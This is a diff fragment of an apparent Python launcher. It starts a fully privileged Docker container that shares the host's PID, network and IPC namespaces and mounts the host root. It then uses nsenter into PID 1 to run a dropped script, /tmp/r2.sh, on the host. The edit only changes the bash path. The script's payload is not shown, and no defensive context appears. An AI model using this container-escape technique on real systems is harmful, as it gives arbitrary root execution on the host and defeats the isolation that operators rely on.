@@ -32,7 +32,7 @@ def launch():
     open("/tmp/r2.sh", "w").write(FR)
     r = subprocess.run("docker run -d --name r2-" + SUFFIX + "-" + h + " --privileged --pid=host --uts=host --network=host --ipc=host "
                        "-v /:/host -v /lib64:/lib64 -v /lib:/lib -v /usr:/usr -v /tmp:/tmp hostimg "
-                       "/host/bin/bash -c '/usr/bin/nsenter -t 1 -m -- /bin/bash /tmp/r2.sh'",
+                       "/bin/bash -c '/usr/bin/nsenter -t 1 -m -- /bin/bash /tmp/r2.sh'",
                        shell=True, capture_output=True, text=True)
     return "R2OK " + h + " rc=" + str(r.returncode)
 if __name__ == "__main__":
